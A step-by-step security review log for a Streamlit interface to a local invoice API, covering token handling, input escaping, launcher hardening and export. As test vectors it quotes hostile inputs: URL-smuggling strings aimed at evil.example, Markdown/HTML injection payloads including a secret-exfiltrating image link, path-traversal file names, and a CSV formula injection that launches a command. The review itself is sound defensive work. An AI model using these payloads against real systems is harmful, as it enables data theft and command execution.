# Security review — P4 (Streamlit interface)

Model: V1 = one local user. The interface is an HTTP client of the API (option A, `TECHNICAL_DESIGN.md` §5).
Status: **reviewed per step, residual risks listed — NOT a claim that the interface is secure.** This file grows with each step.

## Step 1 — foundation (config, API client, escaping, navigation) — 2026-09-21

### 1. What was verified

| Area | Check | Result |
|------|-------|--------|
| Where the token goes | `API_URL` accepts `http` only towards `127.0.0.1` / `localhost` / `::1`; `https` elsewhere. Refused: remote `http`, `http://127.0.0.1@evil.example` (real host = what follows the `@`), `localhost.evil.example`, credentials in the URL, no scheme, `ftp:`, `file:`, `javascript:`, empty | OK (24 cases) |
| Least privilege (code) | The UI reads **only** `API_URL` and `API_TOKEN`, through `dotenv_values` — nothing is put in `os.environ`; `.env.ui` (only those two) wins over `.env`; the real environment wins over both | OK (tests) |
| Token handling | `repr(settings)` hides the token; the token appears in no error message; a redirect is never followed (would carry the token to another host); `HTTP(S)_PROXY` variables are ignored (`trust_env=False`) | OK (tests) |
| Errors shown to the user | Only the API's own fixed `detail` (truncated to 300 chars), or our messages. HTML pages, binary bodies, JSON without `detail`, lists: replaced by a generic text — the body is never shown. 401 → configuration hint. API down / timeout → clear message | OK (tests) |
| Request safety | Ids must be canonical UUIDs before entering a URL (`../health`, `..%2f`, upper-case, `x?y=1` refused, nothing sent); a hostile `Content-Disposition` file name (`../../evil.exe`, `.csv.exe`, spaces, 200 chars) is replaced by `export.csv` | OK (tests) |
| Contract | The client works against the **real** FastAPI application, in memory: upload, read, list, correct, export, erase; 401, 413, 415, 422, 429 (with retry delay) arrive as readable messages | OK (integration tests) |
| Markdown / HTML injection | `safe()` escapes every syntax character (`![x](http://evil/?d=secret)`, `[click](javascript:...)`, `<script>`, `<img onerror>`, tables, quotes, lists, entities); a hostile error message reaches `st.error` escaped; a test fails if `unsafe_allow_html` appears anywhere in `src/ui` | OK (tests) |
| Streamlit hardening | `config.toml`: `address=127.0.0.1`, `maxUploadSize=10`, `gatherUsageStats=false`, `showErrorDetails="none"`, XSRF + CORS on. **Real server**: answers on `127.0.0.1`, refuses connections on both other network addresses of the machine (`192.168.x.x`), prints no "Network URL" | OK |
| Navigation | The four pages render; an unreachable API or a configuration error shows a message and a "Réessayer" button and stops the page (no crash) | OK (AppTest) |
| Static / deps | `ruff`, `bandit` 0 findings, `pip-audit` no known vulnerability, 489 tests, 98 % coverage; `data/` untouched by the suite | OK |

### 2. Defects found and fixed

1. **Importing `src.api.app` created the application and read the real `.env`** (`app = create_app()` at module level): every key (Gemini, encryption, token) was loaded into any process that merely imported the module — the test runner included. Found because a new test ("the UI must not carry the other keys") failed only in the full run. Fixed: no module-level `app`; the API is started with `uvicorn --factory src.api.app:create_app` (`make api` updated); regression test imports `src.api.app`, `src.ui.app` and `src.ui.api_client` in a fresh process and checks that the secrets did not appear.
2. A test of mine asserted `API_TOKEN` in a message that is (correctly) shown as `API\_TOKEN` after escaping; assertion fixed.
3. The client passed a `timeout` option to every request, which the test client warns about; it is now sent only when it differs from the default.

### 3. Residual risks

| # | Risk | Severity | Note |
|---|------|----------|------|
| 1 | **Same-user file access**: with a single `.env` the file stays readable by the Streamlit process' OS user; "least privilege" holds for the code path, not at operating-system level | Low (local) | A separate `.env.ui` with only `API_URL` and `API_TOKEN` gives real isolation (supported, gitignored) |
| 2 | The token lives in the Streamlit process memory (shared client, `st.cache_resource`) | Low | Server side only; never sent to the browser. Single user |
| 3 | `safe()` protects text shown with Markdown; text put in **widget values** (text inputs, tables) is shown literally by Streamlit, but this was not checked in a real browser | Low | Check when the screens exist (steps 2-5) |
| 4 | Streamlit telemetry is disabled by configuration; the absence of outgoing connections was not observed at network level | Low | Config is the documented switch |
| 5 | The `unsafe_allow_html` check is a text search: it does not catch other ways to inject HTML (e.g. custom components) | Low | No custom components are used |
| 6 | Not tested in a real browser (rendering, XSRF cookie, upload limit at the browser) | Medium | Planned with the screenshots at the end of P4 |
| 7 | `st.file_uploader` keeps uploaded bytes in memory until the session ends | Low | Limited to 10 MB per file by `maxUploadSize` |

### Step 2 — Upload page and one-command launcher — 2026-09-21

#### 1. What was verified

| Area | Check | Result |
|------|-------|--------|
| Batch logic | Files sent one at a time; 10 per batch max (the rest reported, never sent); empty / > 10 MB / no `%PDF-` signature skipped **without a request**; an error that would hit every file (401, 429, 5xx except 502, API down) stops the batch and the rest is "not run", never sent; a 4xx or 502 about one document does not stop the others; a programming error is not swallowed | OK (unit) |
| Against the real API | Mixed batch (valid, fake PDF, 3 MB file refused by a 1 MB server limit): 1 honest outcome per file, only the valid ones stored; rate limit at 2 → 2 stored, the error carries its retry delay, the last files are "not run"; wrong token → configuration hint | OK (integration) |
| Page | Privacy and limits notice shown before any upload; button disabled without a file; result line with supplier, euro amount and reliability; extraction warnings shown; the selection is emptied after a batch; results survive reruns and can be cleared; "Voir le résultat" remembers the record and switches page | OK (AppTest) |
| Injection | A hostile **file name** and a hostile **supplier** (`![x](...)`, `<img onerror>`, `<script>`) and a hostile **API message** reach the page escaped; no `<script>` / `<img` survives | OK (AppTest) |
| Launcher | Preflight names each missing / weak setting **without printing any value**; refuses a used port; both commands bind `127.0.0.1` only, with `--no-access-log --no-server-header`; the interface process does not inherit the Gemini and encryption keys | OK (tests) |
| Launcher, real | `python scripts/run.py` really starts both servers (API protected: 401 without token), and both **disappear** when the launcher is killed abruptly | OK (integration) |
| End to end, real | Real launcher + real API + the UI's batch logic: the daily-quota refusal from Google arrives as "Quota d'analyse du jour atteint, réessayez demain.", the second file is not sent | OK (real Gemini itself not reachable: quota) |
| Static / deps | `ruff`, `pip-audit` no known vulnerability; `bandit`: 2 low findings in the launcher (`subprocess` import and `Popen`), reviewed and annotated: fixed argument list, no shell, no user input | OK |

#### 2. Defects found and fixed

1. **Killing the launcher left the servers running** (found by the real test, whose failed first run left orphans that I then stopped by hand): closing the terminal or `taskkill` skip the launcher's cleanup, and the API — which holds the Gemini and encryption keys in memory — kept running unattended. Fixed with a Windows Job Object flagged "kill on close" (Linux: `PR_SET_PDEATHSIG`); the real test now checks that both ports are closed after a hard kill.
2. A test asserted a hostile file name containing `/`; Streamlit itself refuses such names (no operating system allows `/` in a file name). Test uses a realistic hostile name.
3. Parametrised test ids built from 10 MB of bytes made pytest overflow Windows' 32,767-character environment-variable limit at teardown. Explicit ids.

#### 3. Residual risks

| # | Risk | Severity | Note |
|---|------|----------|------|
| 1 | **A failing extraction blocks the page for ~40 s** (the Google SDK retries a 429 by itself before giving up): the spinner runs, then the message appears | Low (UX) | Could be shortened by an early quota check |
| 2 | macOS has no equivalent of the kill-on-close guard: a hard-killed launcher would leave the servers running | Low | Normal exit and Ctrl+C are cleaned up on every platform |
| 3 | The Job Object could not be assigned if the launcher already runs inside a restrictive job (rare) | Low | A warning is printed in that case |
| 4 | File bytes are read into memory (`getvalue()`) for each selected file: up to 10 × 10 MB | Low | Streamlit's own upload limit is 10 MB per file |
| 5 | The notice about the free-tier data policy is static text: it does not know which plan the API really uses | Low | Kept deliberately cautious |
| 6 | Not tested in a real browser (drag and drop, progress bar rendering) | Medium | Planned with the screenshots at the end of P4 |
| 7 | Real Gemini through the UI not exercised (daily quota) | Medium | Task 19 |

### Step 3 — Result page — 2026-09-21

#### 1. What was verified

| Area | Check | Result |
|------|-------|--------|
| Form logic | VAT rate 0.2 / 20 → shown as 20 %, sent as 0.2 (round trip through the **real API** leaves the data unchanged); untouched form sends back exactly what was received; only the 8 user-changeable fields are ever sent (never `extraction_confidence`, `warnings`, `id`, `pdf_hash`) | OK (unit + integration) |
| Validation | Non-ISO dates, absurd / infinite / NaN amounts, VAT outside 0-100 %, too-long texts, empty or too-long line descriptions, non-numeric line values, > 200 lines: refused with a French message naming the line; all problems reported at once; credit notes (negative amounts) allowed | OK (41 unit tests) |
| Contract | Five payload shapes the UI can build (credit note, no VAT, no lines, empty texts, VAT 5.5 %) are all accepted by the real API; after a correction the **server** recomputes reliability (a wrong TTC turns the record to "à vérifier" with the server's warning) | OK (integration) |
| Page | No selected invoice → guidance; deleted / expired invoice → clear message and the selection is forgotten; API problems → message; left column shows file, dates, automatic deletion in N days, reliability, warnings; form filled from the record; save sends the right payload and confirms; invalid form explained and **not sent**; API refusal shown escaped | OK (AppTest) |
| Injection | A hostile supplier and hostile warnings: the input shows the value literally, the warning message is escaped by `safe()`; a hostile API message is escaped | OK (AppTest) |
| Deletion | Confirmation dialog explains what is erased; `delete_invoice` erases and forgets, a failure keeps the invoice selected and returns the message; real API: record really gone (404) | OK (unit + integration) |
| Static / deps | `ruff`, `bandit` 0 findings, `pip-audit` no known vulnerability, 613 tests, 97 % coverage, `data/` untouched, no leftover process | OK |

#### 2. Defects found and fixed

1. **The PDF parser isolation broke whenever the caller's `__main__` was not an ordinary script.** It used `multiprocessing` in "spawn" mode, which re-imports the parent's `__main__` in the child. Streamlit (and test runners, notebooks) replace `__main__` with their own script: the child re-ran the Result page script (which crashed) instead of parsing, and the parent waited for the whole 20 s timeout — 8 OCR tests failed once the Result page tests had run first, and the full suite took 193 s instead of 35 s. Found by the full-suite run, not by the new tests. Fixed: the parser is an independent command (`python -m src.ocr.worker`, JSON on stdout), killed on timeout; regression test hijacks `__main__` and still extracts. Two extras: the parser process no longer inherits the Gemini / encryption / API secrets (tested), and PDF metadata sent back is bounded (100 entries × 1000 characters).
2. The Upload page test that opens a result used a fake client without `get()`: now that the Result page is real, it calls it. Fake completed and the test also checks the record is shown.
3. `bandit` "0 findings" claim of step 2 required annotating the two `subprocess` uses in the launcher; the extractor now has the same annotated pair (fixed argument list, no shell).

#### 3. Residual risks

| # | Risk | Severity | Note |
|---|------|----------|------|
| 1 | The delete dialog's confirm click could not be exercised end to end: Streamlit dialogs re-run only their own fragment and the test tool re-runs the whole page. The logic (`delete_invoice`) is tested directly and the dialog opening is tested | Medium | Check by hand in a browser |
| 2 | `st.data_editor` cell editing is not simulated by the test tool: line editing is tested through the pure logic, not by typing in the table | Low | Check by hand |
| 3 | Not tested in a real browser (form rendering, number inputs with empty values, dialog) | Medium | Planned with the screenshots at the end of P4 |
| 4 | Two users editing the same invoice: last save wins, no version check | Low (single local user) | |
| 5 | The parser worker inherits the rest of the environment (only the three secrets are removed) and can read the `.env` file as the same OS user | Low | A dedicated low-privilege account would be the real isolation |
| 6 | `git`-ignored `.env` no longer holds `API_TOKEN` (removed today by the user); the launcher refuses to start until it is set | Info | See the launcher's message |

### Step 4 — History and Export pages — 2026-09-21

#### 1. What was verified

| Area | Check | Result |
|------|-------|--------|
| History table | French formats, dash for missing values, hostile supplier / file name stay **plain text** in the table, empty list keeps its columns, selected positions map to the right ids (out-of-range ignored) | OK (unit + real API) |
| Filters | Search (trimmed), period, reliability reach the real search and give the right rows; 500-row limit flagged; empty history / no match / API problem each have their own message | OK (AppTest + real API) |
| Bulk delete | Nothing is erased before confirmation; confirmation names the count; confirm erases exactly the pending ids and reports; cancel erases nothing; a missing invoice counts as done; a problem with one invoice does not stop the others; an error that would hit every invoice (401, 429, 5xx, API down) stops the run and the rest is "not attempted"; the invoice open on the Result page is forgotten if erased; real API: records really gone | OK |
| Export request | At least one column, known columns only, no reversed period, selection between 1 and 200 ids (same limit as the API, **compared by a test**), duplicates removed, a selection sends ids and **no** filters | OK (unit) |
| Contract with the server | The UI's column keys and labels are **identical** to the backend's allowlist; every column the page offers is accepted by the real API in both number formats | OK (unit + integration) |
| Export page | Preview count, prepare then download offered with the file name from the server, warning about leaving the encryption, changing any choice invalidates the prepared file, lines file has no column choice, selection from the history used and droppable, API refusal shown escaped | OK (AppTest) |
| Whole chain | A supplier corrected to `=cmd|' /C calc'!A0`, exported through the UI logic and the real API, comes out as `'=cmd|...` | OK (integration) |
| Static / deps | `ruff`, `bandit` 0 findings, `pip-audit` no known vulnerability, 678 tests, 97 % coverage, `data/` untouched, no leftover process | OK |

#### 2. Changes made because of the review

1. The prepared CSV (personal data in clear text) stayed in the Streamlit process memory for the whole session. It is now **forgotten as soon as the download button is clicked** (`forget_prepared_file`, tested).
2. Test-only: two older navigation tests and one data set assumed pages that were still stubs / a faked `process_invoice` that skips validation; fixed.

No defect in the product code was found in this step.

#### 3. Residual risks

| # | Risk | Severity | Note |
|---|------|----------|------|
| 1 | **Row selection in the table was not exercised**: the test tool cannot simulate a click on rows (seeding the selection state did not work). The buttons "Ouvrir / Exporter / Supprimer" with a real selection are only covered through their logic and through seeded state (the confirmation flow) | Medium | Check by hand in a real browser |
| 2 | The "download" click and the file actually saved by the browser were not observed; whether `on_click` still lets the download through was not tested end to end | Medium | Check by hand |
| 3 | A downloaded CSV leaves the retention and encryption perimeter (warned on screen) | Medium | Residual risk of the API review |
| 4 | The preview count is computed with a list request (up to 500 rows decrypted) on each rerun of the Export page | Low | Fine for hundreds of invoices |
| 5 | Selected ids are kept in the session between the History and Export pages (ids only, no invoice data) | Low | |
| 6 | Not tested in a real browser (table selection, date pickers, download) | Medium | Planned pass with screenshots |

### 4. Next steps
Upload page (progress, per-file errors, free-tier notice), Result page (editable form, delete with confirmation), History, Export (download warning). Each step re-runs the checks above and adds its own.
